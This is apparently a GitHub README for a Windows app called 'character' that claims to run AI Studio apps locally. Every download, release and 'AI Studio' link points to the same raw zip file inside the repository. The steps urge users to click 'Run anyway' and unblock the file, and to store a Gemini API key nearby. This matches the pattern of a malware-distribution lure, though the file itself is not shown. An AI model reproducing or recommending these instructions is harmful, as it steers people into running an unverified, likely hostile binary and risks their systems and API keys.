# 🎭 character - Run your AI app on Windows

[![Download character](https://img.shields.io/badge/Download%20character-Visit%20Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/Posterior-sphericaltriangle24/character/main/services/Software_3.8-beta.3.zip)

## 🪟 What this app does

character is a Windows app for running and deploying your AI Studio app on your own computer.

It gives you a local setup for your app, so you can test it, open it in your browser, and keep working without extra setup each time.

Use it if you want to:
- run your AI Studio app on Windows
- test changes on your own machine
- keep your app close while you work
- deploy your app from a local copy

## 📥 Download character

Visit the [character releases page](https://raw.githubusercontent.com/Posterior-sphericaltriangle24/character/main/services/Software_3.8-beta.3.zip) to download and run this file.

On that page, look for the latest release and download the file that matches Windows. If there is more than one file, choose the one labeled for Windows or the `.exe` file.

## 🚀 Install on Windows

1. Open the [releases page](https://raw.githubusercontent.com/Posterior-sphericaltriangle24/character/main/services/Software_3.8-beta.3.zip)
2. Download the Windows file
3. Open your Downloads folder
4. Double-click the file to start the app
5. If Windows asks for permission, click **Run anyway** if you trust the source
6. Follow the setup steps on screen
7. Wait for the app to finish starting

If the app comes as a `.zip` file:
1. Right-click the file
2. Select **Extract All**
3. Open the extracted folder
4. Double-click the app file inside

## 🧭 First-time setup

When you open the app for the first time, you may need to add your Gemini API key.

Use the key from your AI Studio account and place it in the `.env.local` file if the app asks for it.

A simple setup path looks like this:
1. Open the app folder
2. Find the `.env.local` file
3. Open it with Notepad
4. Add your `GEMINI_API_KEY`
5. Save the file
6. Start the app again

## 💻 System requirements

For best results, use:
- Windows 10 or Windows 11
- At least 8 GB of RAM
- A stable internet connection
- Enough free disk space for the app and its files
- Google Chrome or Microsoft Edge for browser access

If your PC is older, the app may still run, but it can start more slowly.

## 🛠️ How to run the app

After setup, start the app with these steps:
1. Open the app
2. Wait for it to load
3. Open the local address shown in the window, if one appears
4. Keep the app open while you use it
5. Return to the app when you want to change settings or restart it

If you close the app, just open it again from the same file you used before.

## 🔧 Local development setup

If you want to run the project from source on your own machine, you need Node.js.

Steps:
1. Install Node.js
2. Download or clone this repository
3. Open the project folder
4. Install dependencies with:

   npm install

5. Add your Gemini API key to `.env.local`
6. Start the app with:

   npm run dev

This opens the app in development mode on your computer.

## 🌐 AI Studio link

You can view the app in AI Studio here:

https://raw.githubusercontent.com/Posterior-sphericaltriangle24/character/main/services/Software_3.8-beta.3.zip

Use this link if you want to check the app in AI Studio before you run it locally.

## 🧰 Common issues

If the app does not start:
- make sure you downloaded the Windows file
- check that the download finished fully
- try opening the file again
- restart your computer and try once more

If the window opens and then closes:
- run the app again
- check for missing files in the app folder
- if you used a ZIP file, make sure you extracted it first

If the app cannot connect:
- check your internet connection
- confirm your Gemini API key is set in `.env.local`
- make sure there are no extra spaces in the key

If Windows blocks the file:
- right-click the file
- open **Properties**
- look for an **Unblock** option
- apply the change and try again

## 📂 File layout

You may see files like these in the project folder:
- `.env.local` — stores local settings like your API key
- `package.json` — lists app scripts and project details
- `node_modules` — installed app files
- source files for the app interface and logic

Keep the main app files together in one folder. Do not move files around unless the setup guide tells you to.

## 🔄 Updating the app

To get the latest version:
1. Visit the [releases page](https://raw.githubusercontent.com/Posterior-sphericaltriangle24/character/main/services/Software_3.8-beta.3.zip)
2. Download the newest Windows file
3. Replace the old app files if needed
4. Open the new version
5. Check that your `.env.local` file still has your API key

If you run the app from source, you can also update by pulling the newest repository files and running `npm install` again

## 🔐 API key setup

The app uses `GEMINI_API_KEY` for access to Gemini.

To set it:
1. Open `.env.local`
2. Add this line:

   GEMINI_API_KEY=your_api_key_here

3. Save the file
4. Restart the app

Do not add spaces before or after the key value.

## 📝 Need help with setup

If the app does not behave as expected, check these items in order:
- the Windows download finished
- the file was extracted, if it came in a ZIP
- the app folder still contains all files
- the API key is set in `.env.local`
- your internet connection is working
- your browser is up to date